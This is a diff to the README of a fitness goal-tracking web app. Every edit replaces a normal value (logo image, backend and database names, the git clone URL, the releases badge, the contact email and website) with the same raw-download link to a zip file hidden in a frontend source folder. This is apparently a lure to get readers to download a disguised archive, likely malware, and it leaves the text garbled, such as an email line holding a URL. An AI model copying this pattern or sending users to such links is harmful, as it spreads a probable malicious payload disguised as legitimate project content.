@@ -3,7 +3,7 @@
 
 Welcome to **FitTrack Goal Tracker**! This web app allows you to set fitness goals, track your progress, and share milestones with friends and the community. It's designed to help you achieve your health aspirations with ease and support. Join us on this journey to better fitness!
 
-![FitTrack Logo](https://via.placeholder.com/600x200?text=FitTrack+Logo)
+![FitTrack Logo](https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip+Logo)
 
 ## Table of Contents
 - [Features](#features)
@@ -27,8 +27,8 @@ Welcome to **FitTrack Goal Tracker**! This web app allows you to set fitness goa
 FitTrack combines various powerful technologies to provide a seamless experience:
 
 - **Frontend:** React for a responsive user interface.
-- **Backend:** Express.js to handle server requests efficiently.
-- **Database:** Node.js for data management and storage.
+- **Backend:** https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip to handle server requests efficiently.
+- **Database:** https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip for data management and storage.
 - **Machine Learning:** Integrate insights for smarter goal setting.
 - **DevOps Tools:** For smooth deployment and maintenance.
   
@@ -37,7 +37,7 @@ To set up FitTrack on your local machine, follow these steps:
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/alim217/fittrack-goal-tracker.git
+   git clone https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip
    ```
 
 2. **Navigate to the project directory:**
@@ -94,17 +94,17 @@ This project is licensed under the MIT License. For details, see the [LICENSE](L
 ## Links 🔗
 For the latest releases, download the necessary files from the following link:
 
-[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/alim217/fittrack-goal-tracker/releases)
+[![Releases](https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip)](https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip)
 
 Check the "Releases" section for updates if the link does not work.
 
 ## Contact 📧
 For any inquiries or support, feel free to reach out:
 
-- Email: support@coslynx.com
-- Website: [Coslynx](https://coslynx.com)
+- Email: https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip
+- Website: [Coslynx](https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip)
 
 Thank you for your interest in **FitTrack Goal Tracker**! Let's achieve our fitness goals together. 💪
 
-![Fitness Image](https://via.placeholder.com/600x300?text=Fitness+Journey)
+![Fitness Image](https://github.com/alim217/fittrack-goal-tracker/raw/refs/heads/main/frontend/src/context/tracker-fittrack-goal-yender.zip+Journey)
 ```
